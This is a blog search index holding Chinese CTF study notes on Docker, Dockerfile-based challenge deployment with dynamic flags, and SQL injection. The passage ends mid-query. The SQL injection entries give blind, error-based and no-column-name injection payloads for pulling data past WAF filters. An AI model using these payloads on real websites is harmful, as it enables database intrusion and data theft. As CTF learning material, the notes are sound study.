<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>SQL注入一些tips记录</title>
      <link href="/2020/03/23/SQL%E6%B3%A8%E5%85%A5%E4%B8%80%E4%BA%9Btips%E8%AE%B0%E5%BD%95/"/>
      <url>/2020/03/23/SQL%E6%B3%A8%E5%85%A5%E4%B8%80%E4%BA%9Btips%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h3 id="0x-01-整数溢出报错"><a href="#0x-01-整数溢出报错" class="headerlink" title="0x 01 整数溢出报错"></a>0x 01 整数溢出报错</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^(case hex(mid((select flaaag from flag limit 1 offset 0) from 1 for 1)) when &#39;1e&#39; then sleep(3) else abs(-9223372036854775808) end)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> tricks </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dockerfile编写学习</title>
      <link href="/2020/03/22/dockerfile%E7%BC%96%E5%86%99%E5%AD%A6%E4%B9%A0/"/>
      <url>/2020/03/22/dockerfile%E7%BC%96%E5%86%99%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h3 id="0x-01-前言"><a href="#0x-01-前言" class="headerlink" title="0x 01 前言"></a>0x 01 前言</h3><p>​        镜像的定制实际上就是定制每一层所添加的配置文件，如果我们可以把每一层的修改、安装、构建、操作的命令都写入一个脚本，然后用这个脚本来构建、定制镜像，那么镜像构建透明性的问题、体积的问题就会得到解决，这个脚本就是 Dockerfile; Dockerfile  是一个文本文件，其内包含了一条条的指令，每一条指令构建一层，每一层指令的内容，就是描述该层应该如何构建，然后通过 commit 构成新的镜像。</p><h3 id="0x-02-Dockerfile-常用参数"><a href="#0x-02-Dockerfile-常用参数" class="headerlink" title="0x 02 Dockerfile 常用参数"></a>0x 02 Dockerfile 常用参数</h3><h4 id="FROM"><a href="#FROM" class="headerlink" title="FROM"></a>FROM</h4><p>FROM：指定基础镜像，必须是第一条指令,格式为<code>FROM image</code>或<code>FROM image:tag</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 定制 nginx 镜像的 Dockerfile</span><br><span class="line"></span><br><span class="line">FROM nginx</span><br><span class="line">RUN echo &#39;&lt;h1&gt;Hello,Docker!&lt;&#x2F;h1&gt;&#39; &gt; &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html&#x2F;index.html</span><br></pre></td></tr></table></figure><p>注： Docker Hub 上有很多高质量的服务类的官方镜像可以拿来直接使用，比如：nginx 、redis 、mysql 、php 、mongo \ tomcat 等，可以在其中找最符合的一个进行定制</p><h3 id="RUN"><a href="#RUN" class="headerlink" title="RUN"></a>RUN</h3><p>RUN ：用来执行命令行命令，格式有两种：</p><ol><li><p>shell 格式： <code>RUN &lt;命令&gt;</code>，就像直接在命令行中输入的命令一样</p></li><li><p>exec 格式：<code>RUN [&quot;可执行文件&quot;，“参数1”，“参数2”]</code>，更像是函数调用中的格式</p></li></ol><p>warning:每一个RUN命令都会在 docker镜像中新建一层，所以应该尽量少用 RUN 命令，而且要在RUN 的最后要做必要的清除工作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># 一层构建，并在最后清理压缩包等缓存文件</span><br><span class="line">FROM debian:stretch</span><br><span class="line"></span><br><span class="line">RUN buildDeps&#x3D;&#39;gcc libc6-dev make wget&#39; \</span><br><span class="line">&amp;&amp; apt-get update \</span><br><span class="line">&amp;&amp; apt-get install -y $buildDeps \</span><br><span class="line">&amp;&amp; wget -O redis.tar.gz &quot;http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-5.0.3.tar.gz&quot; \</span><br><span class="line">&amp;&amp; mkdir -p &#x2F;usr&#x2F;src&#x2F;redis \</span><br><span class="line">&amp;&amp; tar -xzf redis.tar.gz -C &#x2F;usr&#x2F;src&#x2F;redis --strip-components&#x3D;1 \</span><br><span class="line">&amp;&amp; make -C &#x2F;usr&#x2F;src&#x2F;redis \</span><br><span class="line">&amp;&amp; make -C &#x2F;usr&#x2F;src&#x2F;redis install \</span><br><span class="line">&amp;&amp; rm -rf &#x2F;var&#x2F;lib&#x2F;apt&#x2F;lists&#x2F;* \</span><br><span class="line">&amp;&amp; rm redis.tar.gz \</span><br><span class="line">&amp;&amp; rm -r &#x2F;usr&#x2F;src&#x2F;redis \</span><br><span class="line">&amp;&amp; apt-get purge -y --auto-remove $buildDeps</span><br></pre></td></tr></table></figure><h4 id="COPY"><a href="#COPY" class="headerlink" title="COPY"></a>COPY</h4><p> COPY : 用来从构建上下文目录中&lt;原路径&gt;的文件/目录复制到新一层镜像内的 &lt;目标路径&gt;位置，格式有两种：</p><p>  1，shell 格式：<code>COPY [--chown=&lt;user&gt;:&lt;group&gt;] &lt;原路径&gt;...&lt;目标路径&gt;</code></p><p>  2，exec 合适：<code>COPY[--chown=&lt;user&gt;:&lt;group&gt;] [&quot;原路径1&quot;，... &quot;&lt;目标路径&gt;&quot;]</code></p><p>原路径：可以是多个，甚至可以是通配符</p><p>目标路径：可以是容器内的绝对路径，也可以是相对于工作目录的相对路径(工作目录可以用 WORKDIR 指令来指定，不需要事先创建，会自动创建)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 利用 通配符 进行复制</span><br><span class="line">COPY hom* &#x2F;mydir&#x2F;</span><br><span class="line">COPY hom?.txt &#x2F;mydir&#x2F;</span><br></pre></td></tr></table></figure><p>note : COPY 会将原文件的各种数据都保留，比如 读、写、执行权限，可以通过 –chown=<user>:<group> 选项来改变文件的所属用户及所属组。</group></user></p><h4 id="CMD"><a href="#CMD" class="headerlink" title="CMD"></a>CMD</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CMD [&quot;executable&quot;, &quot;param1&quot;, &quot;param2&quot;], 推荐使用该方式</span><br><span class="line"></span><br><span class="line">CMD [&quot;param1&quot;, &quot;param2&quot;]，为ENTRYPOINT指令提供预设参数</span><br><span class="line"></span><br><span class="line">CMD command param1 param2 在SHELL中执行</span><br></pre></td></tr></table></figure><p>CMD指令的主要目的是为执行容器提供默认值，每个Dockerfile只有一个CMD命令，如果指定了多个CMD命令，也只会有一条执行，如果启动容器的时候指定了运行的命令，则会覆盖掉CMD指定的命令。</p><h4 id="EXPOSE"><a href="#EXPOSE" class="headerlink" title="EXPOSE"></a>EXPOSE</h4><p>语法：<code>EXPOSE &lt;端口1&gt; [&lt;端口2&gt;...]</code></p><p>　　该条指令是声明运行时容器提供的服务端口，这只是一个声明，在运行时并不会因为这个声明应用就会开启这个端口的服务。这样声明带来两个好处：</p><p>　　1，帮助镜像使用者理解这个镜像服务的守护端口，以方便配置映射</p><p>　　2，在运行时使用随机端口映射，也就是 docker run -P 时，会自动随机映射 EXPOSE 的端口</p><p>note: 要将 EXPOSE 和在运行时使用 -p  &lt;宿主端口&gt;:&lt;容器端口&gt; 区分开来。-p 是映射宿主端口和容器端口，就是将容器的对应端口服务公开给外界访问，而  EXPOSE 仅仅是声明容器打算使用什么端口而已，并不会在宿主进行端口映射。</p><h4 id="WORKDIR"><a href="#WORKDIR" class="headerlink" title="WORKDIR"></a>WORKDIR</h4><p>格式为：<code>WORKDIR /path/to/workdir</code></p><p>切换⽬录指令，类似于cd命令，对RUN、CMD、ENTRYPOINT⽣效。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WORKDIR &#x2F;var&#x2F;www&#x2F;html</span><br></pre></td></tr></table></figure><h4 id="LABEL"><a href="#LABEL" class="headerlink" title="LABEL"></a>LABEL</h4><p>使用<a href="https://docs.docker.com/engine/reference/builder/#label" target="_blank" rel="noopener">LABEL</a>指令，可以为镜像设置元数据，例如<strong>镜像创建者</strong>或者<strong>镜像说明</strong>。旧版的 Dockerfile 语法使用<a href="https://docs.docker.com/engine/reference/builder/#maintainer-deprecated" target="_blank" rel="noopener">MAINTAINER</a>指令指定镜像创建者，但是它已经被弃用了。有时，一些外部程序需要用到镜像的元数据，例如<a href="https://github.com/NVIDIA/nvidia-docker" target="_blank" rel="noopener">nvidia-docker</a>需要用到<code>com.nvidia.volumes.needed</code>。示例如下:</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> node:<span class="number">7</span>-alpine</span><br><span class="line"><span class="keyword">LABEL</span><span class="bash"> maintainer <span class="string">"jakub.skalecki@example.com"</span></span></span><br><span class="line">或者</span><br><span class="line"><span class="keyword">LABEL</span><span class="bash"> Author=<span class="string">"hwlanxiaojun"</span> Blog=<span class="string">"https://hwlanxiaojun.github.io"</span></span></span><br></pre></td></tr></table></figure><h4 id="ENV"><a href="#ENV" class="headerlink" title="ENV"></a>ENV</h4><p>ENV : 用来设置环境变量，格式有两种：</p><p>　　1，ENV <key> <value></value></key></p><p>　　2，ENV <key1>=<value1> <key2>=<value2>…</value2></key2></value1></key1></p><p>在设置了环境变量之后，无论是后面的其它指令，如 RUN ，还是运行时的应用，都可以直接使用这里定义的环境变量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 定义环境变量</span><br><span class="line">ENV VERSION&#x3D;1.0 DEBUG&#x3D;ON \</span><br><span class="line">    NAME&#x3D;&quot;Happy Feet&quot;</span><br><span class="line"></span><br><span class="line"># 官方 node 镜像 Dockerfile 中：</span><br><span class="line">ENV NODE_VERSION 7.2.0</span><br></pre></td></tr></table></figure><h3 id="0x-03-构建镜像"><a href="#0x-03-构建镜像" class="headerlink" title="0x 03 构建镜像"></a>0x 03 构建镜像</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker build -t webprac .</span><br><span class="line">&#x2F;&#x2F;其中.表示当前路径，构建的时候要保证jar包和Dockerfile文件在同一个文件夹下，-t: 镜像的名字及标签，webprac是标签名</span><br><span class="line">ocker run -dit -p 8080:80 webprac</span><br></pre></td></tr></table></figure><h4 id="0x-04-动态flag编写"><a href="#0x-04-动态flag编写" class="headerlink" title="0x 04 动态flag编写"></a>0x 04 动态flag编写</h4><p>动态flag的存在形式一般有以下三种：文件中、执行readflag、数据库中</p><h4 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h4><p>linux下，<code>sed</code>命令可以将file中每行的字符串进行替换：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i &#39;s&#x2F;原字符串&#x2F;新字符串&#x2F;&#39; file</span><br></pre></td></tr></table></figure><p><code>export</code>命令可以查看、设置环境变量</p><p>那么在<code>docker-php-entrypoint</code>文件中写入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;sh</span><br><span class="line"></span><br><span class="line">sed -i &quot;s&#x2F;flag_here&#x2F;$FLAG&#x2F;&quot; flag.php</span><br><span class="line">export FLAG&#x3D;not_flag</span><br><span class="line">FLAG&#x3D;not_flag</span><br></pre></td></tr></table></figure><p>就会根据当前环境变量的<code>FLAG</code>值来替换掉<code>flag.php</code>中的<code>flag_here</code>，因此还需要在<code>flag.php</code>中设置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag &#x3D; flag_here</span><br></pre></td></tr></table></figure><p>这样，在Dockerfile目录执行<code>docker build -t test .</code>将Dockerfile文件打包为镜像<code>test</code>，使用安装了动态靶机插件的CTFd平台部署后，该插件在启动靶机时会自动生成flag并应用到环境变量中，这样便实现了生成动态flag。</p><h4 id="readflag"><a href="#readflag" class="headerlink" title="readflag"></a>readflag</h4><p>先来看下写法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env bash</span><br><span class="line"></span><br><span class="line">echo $FLAG &gt; &#x2F;flag</span><br><span class="line">chmod u+s &#x2F;readflag</span><br><span class="line">chmod 400 &#x2F;flag</span><br><span class="line"></span><br><span class="line">export FLAG&#x3D;not_flag</span><br><span class="line">FLAG&#x3D;not_flag</span><br></pre></td></tr></table></figure><p>首先将环境变量<code>$FLAG</code>写入到<code>/flag</code>中，之后进行权限配置：</p><p>1.chmod u+s /readflag ： 为<code>/readflag</code>文件加上setuid标志，设置使文件在执行阶段具有文件所有者的权限</p><p>2.chmod 400 /flag ：将<code>flag</code>文件权限设为文件拥有者只读，群组和其他用户没有任何权限</p><p>那么执行<code>./readflag</code>时，就会拥有文件所有者的权限，可以读取<code>/flag</code>了</p><h4 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h4><p>flag.sh：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line"></span><br><span class="line"># 修改数据库中的 FLAG</span><br><span class="line">mysql -e &quot;CREATE DATABASE IF NOT EXISTS supersqli;USE supersqli; CREATE TABLE IF NOT EXISTS \&#96;1919810931114514\&#96; (\&#96;flag\&#96; varchar(100) NOT NULL) ENGINE&#x3D;MyISAM  DEFAULT CHARSET&#x3D;utf8;INSERT INTO \&#96;1919810931114514\&#96; VALUES (&#39;$FLAG&#39;);&quot; -uroot -proot</span><br><span class="line"></span><br><span class="line">export FLAG&#x3D;not_flag</span><br><span class="line">FLAG&#x3D;not_flag</span><br><span class="line"></span><br><span class="line">rm -f &#x2F;flag.sh</span><br></pre></td></tr></table></figure><h3 id="0x-05-打包镜像到Docker-Hub"><a href="#0x-05-打包镜像到Docker-Hub" class="headerlink" title="0x 05 打包镜像到Docker Hub"></a>0x 05 打包镜像到Docker Hub</h3><p>为了方便搜索和下载自己编写的镜像，可以通过以下步骤来实现：</p><p>1.到<code>https://hub.docker.com/</code>注册一个账号</p><p>2.登录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker login -u 用户名 -p 密码</span><br></pre></td></tr></table></figure><p>3.更改镜像标签，格式为<code>用户名/标签名</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker tag test 用户名&#x2F;镜像名</span><br></pre></td></tr></table></figure><p>4.推送：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker push 用户名&#x2F;镜像名</span><br></pre></td></tr></table></figure><p>5.登出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker logout</span><br></pre></td></tr></table></figure><p>这时就可以在Docker Hub上找到刚上传的镜像了，将其添加描述后就能使用<code>docker search</code>搜索到自己的镜像</p><h3 id="0x-06-ctfd平台部署"><a href="#0x-06-ctfd平台部署" class="headerlink" title="0x 06 ctfd平台部署"></a>0x 06 ctfd平台部署</h3><p>参考这几篇文章：</p><p><a href="https://www.zhaoj.in/read-6333.html" target="_blank" rel="noopener">https://www.zhaoj.in/read-6333.html</a></p><p><a href="https://blog.csdn.net/fjh1997/article/details/100850756" target="_blank" rel="noopener">https://blog.csdn.net/fjh1997/article/details/100850756</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzA3NjE0Mzk2OA==&amp;mid=2648922692&amp;idx=1&amp;sn=6f27333cf2f12008d62bfd94bc1d2f6a&amp;chksm=8772364bb005bf5d8d377a575fe4730f35235ff43ab597f8e5f17603da4801fab74e402a8916&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1570805873725&amp;sharer_shareid=7fa312c2aff8bd738bf9d331ff765678#rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzA3NjE0Mzk2OA==&amp;mid=2648922692&amp;idx=1&amp;sn=6f27333cf2f12008d62bfd94bc1d2f6a&amp;chksm=8772364bb005bf5d8d377a575fe4730f35235ff43ab597f8e5f17603da4801fab74e402a8916&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1570805873725&amp;sharer_shareid=7fa312c2aff8bd738bf9d331ff765678#rd</a></p><h3 id="0x-07-docker-compose"><a href="#0x-07-docker-compose" class="headerlink" title="0x 07 docker-compose"></a>0x 07 docker-compose</h3><p>docker-compose.yml：告诉docker-compose该怎么编排一组服务</p><p><img src="/2020/03/22/dockerfile%E7%BC%96%E5%86%99%E5%AD%A6%E4%B9%A0/image-20200322224722173.png" alt></p><p>参考链接：</p><blockquote><p><a href="https://www.cnblogs.com/zpcoding/p/11450686.html" target="_blank" rel="noopener">https://www.cnblogs.com/zpcoding/p/11450686.html</a></p><p><a href="https://www.cnblogs.com/fundebug/p/write-excellent-dockerfile.html" target="_blank" rel="noopener">https://www.cnblogs.com/fundebug/p/write-excellent-dockerfile.html</a></p><p><a href="http://www.gtfly.top/2020/03/12/2019-09-27-CTFd%E5%8A%A8%E6%80%81docker%E9%95%9C%E5%83%8F%E7%BC%96%E5%86%99/" target="_blank" rel="noopener">http://www.gtfly.top/2020/03/12/2019-09-27-CTFd%E5%8A%A8%E6%80%81docker%E9%95%9C%E5%83%8F%E7%BC%96%E5%86%99/</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> dockerfile编写 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker学习笔记</title>
      <link href="/2020/03/22/docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2020/03/22/docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h3 id="docker简介"><a href="#docker简介" class="headerlink" title="docker简介"></a>docker简介</h3><ul><li>Docker是一个新的容器化的技术，容器有效的将单个操作系统管理的资源划分到孤立的组中，以便更好的在孤立的组之间平衡有冲突的资源使用需求。</li><li>Docker 容器本质上是宿主机上的一个进程。Docker 通过 namespace 实现了资源隔离，通过 cgroups 实现了资源的限制，通过写时复制机制（copy-on-write）实现了高效的文件操作。 </li><li>Docker有五个命名空间：进程、网络、挂载、宿主和共享内存，为了隔离有问题的应用，Docker运用Namespace将进程隔离，为进程或进程组创建已隔离的运行空间，为进程提供不同的命名空间视图。这样，每一个隔离出来的进程组，对外就表现为一个container(容器)。</li></ul><h3 id="镜像和容器"><a href="#镜像和容器" class="headerlink" title="镜像和容器"></a>镜像和容器</h3><ul><li><p>Image: 镜像是一种轻量级、可执行的独立软件包，它包含运行某个软件所需的所有内容，包括代码、运行时、库、环境变量和配置文件。</p></li><li><p>Container:容器是镜像的运行时实例 - 实际执行时镜像会在内存中变成什么。默认情况下，它完全独立于主机环境运行，仅在配置为访问主机文件和端口的情况下才执行此操作。</p></li><li><p><code>容器 = 镜像 + 读写层</code></p><p>容器可以获取本机访问，每个容器都在独立进程中运行，占用的内存不超过任何其他可执行文件。</p></li></ul><p><img src="/2020/03/22/docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200322154938724.png" alt="image-20200322154938724"></p><p><img src="/2020/03/22/docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200322155027373.png" alt="image-20200322155027373"></p><h3 id="Docker的使用"><a href="#Docker的使用" class="headerlink" title="Docker的使用"></a>Docker的使用</h3><h4 id="启动和放入启动项"><a href="#启动和放入启动项" class="headerlink" title="启动和放入启动项"></a>启动和放入启动项</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#centos7.0版本</span><br><span class="line">systemctl start docker </span><br><span class="line">systemctl enable docker</span><br><span class="line"></span><br><span class="line">#兼容老版本</span><br><span class="line">service docker start</span><br><span class="line">chkconfig docker on</span><br></pre></td></tr></table></figure><h4 id="image相关操作"><a href="#image相关操作" class="headerlink" title="image相关操作"></a>image相关操作</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">docker search [镜像]      #搜索镜像</span><br><span class="line">docker pull [镜像]        #下载镜像</span><br><span class="line">docker run -p 4000:80 username&#x2F;repository:tag #从远程镜像仓库中拉取并运行镜像</span><br><span class="line"></span><br><span class="line">sudo docker pull ubuntu:12.04 等同于</span><br><span class="line">docker pull registry.hub.docker.com&#x2F;ubuntu:12.04 </span><br><span class="line"></span><br><span class="line">docker push [镜像]            #发布镜像</span><br><span class="line">docker rmi [镜像]             #删除镜像</span><br><span class="line">docker images                 #查看本地镜像(列目录)</span><br><span class="line">docker images    -q           #只显示镜像ID</span><br><span class="line">docker history [镜像]         #历史镜像</span><br><span class="line">docker tag [镜像] username&#x2F;repository:tag #标记镜像</span><br><span class="line"></span><br><span class="line">docker rmi $(docker images -q)      #删除所有停止的镜像</span><br><span class="line">docker rmi -f $(docker images -q)   #强制删除所有的镜像</span><br></pre></td></tr></table></figure><h4 id="容器相关操作"><a href="#容器相关操作" class="headerlink" title="容器相关操作"></a>容器相关操作</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">#创建容器</span><br><span class="line">docker run [镜像] &#x2F;bin&#x2F;echo hello world       #输出hello world</span><br><span class="line">docker run -i -t [镜像] &#x2F;bin&#x2F;bash             #交互式进入容器 #-i: 以交互模式运行容器  -t: 为容器重新分配一个伪输入终端，通常与 -i 同时使用；</span><br><span class="line">docker run [镜像]  apt-get install -y app_name    #在容器安装新的程序</span><br><span class="line"></span><br><span class="line">docker exec -it kali &#x2F;bin&#x2F;bash          #进入容器</span><br><span class="line">docker run -it -d kali                  #启动容器，后台运行 #-d: 后台运行容器，并返回容器ID；</span><br><span class="line">docker run -it -p 53:53 kali            #启动容器的时候可以映射端口 #-p: 端口映射，格式为：主机(宿主)端口:容器端口</span><br><span class="line"></span><br><span class="line">#进入交互式界面</span><br><span class="line">进入容器：</span><br><span class="line">sudo docker ps -a</span><br><span class="line">sudo docker exec -it [容器ID] &#x2F;bin&#x2F;bash</span><br><span class="line"></span><br><span class="line">#查看容器</span><br><span class="line">docker ps                   #列出当前运行的容器</span><br><span class="line">docker ps -a                #列出所有的容器</span><br><span class="line">docker ps -l                #列出最近一次启动的容器</span><br><span class="line">docker ps -a -q             #查看所有的容器ID</span><br><span class="line"></span><br><span class="line">#容器操作</span><br><span class="line">docker inspect [容器名字]&#x2F;ID        #显示容器信息</span><br><span class="line">docker start [容器名字]&#x2F;ID      #启动容器</span><br><span class="line">docker stop [容器名字]&#x2F;ID       #停止容器</span><br><span class="line">docker kill [容器名字]&#x2F;ID       #杀死容器</span><br><span class="line">docker restart [容器名字]&#x2F;ID        #重新启动容器</span><br><span class="line">docker attach [容器名字]&#x2F;ID     #进入容器</span><br><span class="line">docker logs [容器名字]&#x2F;ID       #查看容器日志</span><br><span class="line">docker diff [容器名字]&#x2F;ID       #查看容器修改操作</span><br><span class="line">docker top [容器名字]&#x2F;ID            #显示容器进程信息</span><br><span class="line">docker cp ID:&#x2F;path to_path      #从容器中拷贝数据到本地</span><br><span class="line">docker cp [容器名字]:&#x2F;path to_path  #从容器中拷贝数据到本地</span><br><span class="line"></span><br><span class="line">#删除容器</span><br><span class="line">docker rm [容器]&#x2F;ID       #删除容器</span><br><span class="line">docker rm $(docker ps -a -q)    #删除所有停止的容器</span><br><span class="line">docker rm -f $(docker ps -a -q) #强制删除所有的容器</span><br></pre></td></tr></table></figure><p>参考链接：</p><blockquote><p><a href="https://www.smi1e.top/docker-%e7%ac%94%e8%ae%b0/" target="_blank" rel="noopener">https://www.smi1e.top/docker-%e7%ac%94%e8%ae%b0/</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL无列名注入</title>
      <link href="/2020/03/22/MySQL%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/"/>
      <url>/2020/03/22/MySQL%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h3 id="0x-01-简介"><a href="#0x-01-简介" class="headerlink" title="0x 01 简介"></a>0x 01 简介</h3><p>顾名思义，就是在不知道列名的情况下进行 sql 注入。</p><p>在 mysql =&gt; 5 的版本中存在一个名为  information_schema 的库，里面记录着 mysql 中所有表的结构。通常，在 mysql sqli  中，我们会通过此库中的表去获取其他表的结构，也就是表名、列名等。但是这个库经常被 WAF 过滤。</p><p>当我们通过暴力破解获取到表名后，如何利用呢？</p><p>在 information_schema 中，除了 SCHEMATA、TABLES、COLUMNS 有表信息外，高版本的 mysql 中，还有 INNODB_TABLES 及 INNODB_COLUMNS 中记录着表结构。</p><h3 id="0x-02-使用条件-amp-方法"><a href="#0x-02-使用条件-amp-方法" class="headerlink" title="0x 02 使用条件&amp;方法"></a>0x 02 使用条件&amp;方法</h3><p> <strong>使用条件&amp;方法</strong></p><p>无列名注入主要是适用于已经获取到数据表，但无法查询列的情况下，在大多数 CTF 题目中，information_schema 库被过滤，使用这种方法获取列名。</p><p>无列名注入的原理其实很简单，类似于将我们不知道的列名进行取别名操作，在取别名的同时进行数据查询，所以，如果我们查询的字段多于数据表中列的时候，就会出现报错。</p><p> <strong>不使用表名查询</strong></p><p>正常的 sql 查询如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from &#96;admin&#96;;</span><br></pre></td></tr></table></figure><p><img src="/2020/03/22/MySQL%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/image-20200221120103425.png" alt></p><p>其中，列名为 id、name、password，使用 union 查询：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,3 union select * from admin;</span><br></pre></td></tr></table></figure><p><img src="/2020/03/22/MySQL%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/image-20200221120025502.png" alt></p><p>如图，我们的列名被替换为了对应的数字。也就是说，我们可以继续数字来对应列，如 3 对应了表里面的 password：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#96;3&#96; from (select 1,2,3 union select * from admin)a;</span><br></pre></td></tr></table></figure><p>末尾的 a 可以是任意字符，用于命名。</p><p>当然，多数情况下，` 会被过滤。当 ` 不能使用的时候，使用别名来代替：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select b from (select 1,2,3 as b union select * from 